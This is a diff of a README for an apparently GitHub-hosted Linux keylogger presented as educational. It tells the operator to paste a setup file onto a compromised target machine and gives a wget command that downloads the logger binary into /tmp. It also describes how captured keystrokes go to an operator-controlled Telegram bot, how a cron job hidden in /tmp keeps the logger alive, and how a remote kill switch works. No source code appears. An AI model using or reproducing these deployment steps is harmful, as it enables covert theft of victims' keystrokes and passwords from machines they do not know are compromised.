@@ -7,8 +7,50 @@ This project of a Key Logger is for **educational purposes**. Use it **only** in
 
 This keylogger records keystrokes and saves them locally in a temporary buffer. When the number of captured keystrokes reaches a predefined threshold, the content is automatically sent to a Telegram bot controlled by the operator.
 
-The bot also supports a remote command `/kill <machine_id>` which allows stopping the keylogger execution on a specific machine by remote.
-
 ## How2UseIt
 
-Working progress
+Once you gain access to the target machine, copy and paste the content of `toBePasted.txt` to activate the persistent logger.
+
+You need to configure it for your own setup. Here's how:
+
+1. **Set Your Telegram Token** (Mandatory) 
+   Open `config.py` and insert your Telegram bot token.  
+   > If you’re unsure how to get one, just ask ChatGPT or refer to the [Telegram Bot API docs](https://core.telegram.org/bots).
+
+2. **Customize Logger Behavior**  (Optional)
+   You can configure the logger by modifying flags inside `KeyL.py`.  
+   If you make changes, you'll need to build your own version to install.
+
+By default, `toBePasted.txt` installs the static version hosted on GitHub:
+```bash
+wget -O /tmp/keyl https://raw.githubusercontent.com/fortigate3600/KeyL/main/keyl
+```
+
+
+Before starting the program, send a dummy message to the Telegram bot.
+This is necessary for the bot to retrieve your chat_id and be able to respond to you.
+
+To stop the keylogger on a specific machine remotely,
+send the command `/kill <machine_id>` to the Telegram bot.
+
+
+## How it works
+<img width="1233" height="516" alt="killSwitchMechanism" src="https://github.com/user-attachments/assets/aac92346-7d68-4f4b-8460-fb7a1a382a45" />
+
+The persistence mechanism is simple (and quite weak): if the logger process is killed, it gets respawned automatically by a cronjob calling launc.sh.
+I have hidden the .sh files in the /tmp directory. I could have made it stealthier, but this project is just for academic purposes.
+
+Once the main program calls KillSwitch.sh, the latter delete every file concerning us, and cleans the crojob.
+
+The make.sh script (or the toBePasted.txt) creates the files shown in the image above.
+Now, let’s dive into what the code does.
+
+## Code
+
+It monitors every keypress and stores each key in a buffer. Once the buffer reaches a certain threshold, it sends the content to a Telegram bot.
+
+Specifically, the monitorShift() function checks whether the Shift key is being held down and communicates this through a global flag to monitorKeys(), which logs the pressed keys. If necessary, the keys are passed through a dictionary to convert them to their uppercase equivalents.
+
+
+
+
